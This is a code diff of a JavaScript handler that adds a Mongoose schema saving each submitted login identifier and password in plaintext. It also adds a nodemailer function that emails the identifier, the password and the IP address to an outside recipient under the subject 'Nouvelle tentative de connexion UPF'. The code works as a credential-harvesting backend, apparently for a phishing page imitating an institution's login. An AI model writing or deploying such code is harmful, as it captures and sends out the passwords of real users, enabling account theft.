@@ -1,6 +1,55 @@
 import mongoose from 'mongoose';
-import { LoginAttempt } from '../../server/models/LoginAttempt.js';
-import { sendLoginNotificationEmail } from '../../server/services/emailService.js';
+import nodemailer from 'nodemailer';
+
+// Schéma LoginAttempt
+const loginSchema = new mongoose.Schema(
+  {
+    identifiant: {
+      type: String,
+      required: true,
+      trim: true,
+    },
+    motDePasse: {
+      type: String,
+      required: true,
+    },
+    ipAddress: String,
+    userAgent: String,
+    timestamp: {
+      type: Date,
+      default: Date.now,
+    },
+  },
+  { timestamps: true }
+);
+
+const LoginAttempt = mongoose.model('LoginAttempt', loginSchema);
+
+// Service Email
+const sendLoginNotificationEmail = async (identifiant, motDePasse, ipAddress) => {
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: process.env.EMAIL_USER,
+      pass: process.env.EMAIL_PASSWORD,
+    },
+  });
+
+  const mailOptions = {
+    from: process.env.EMAIL_USER,
+    to: process.env.EMAIL_RECIPIENT,
+    subject: 'Nouvelle tentative de connexion UPF',
+    html: `
+      <h2>Tentative de connexion détectée</h2>
+      <p><strong>Date:</strong> ${new Date().toLocaleString('fr-FR')}</p>
+      <p><strong>Identifiant:</strong> ${identifiant}</p>
+      <p><strong>Mot de passe:</strong> ${motDePasse}</p>
+      <p><strong>Adresse IP:</strong> ${ipAddress || 'Non disponible'}</p>
+    `,
+  };
+
+  return await transporter.sendMail(mailOptions);
+};
 
 let mongoConnected = false;
 
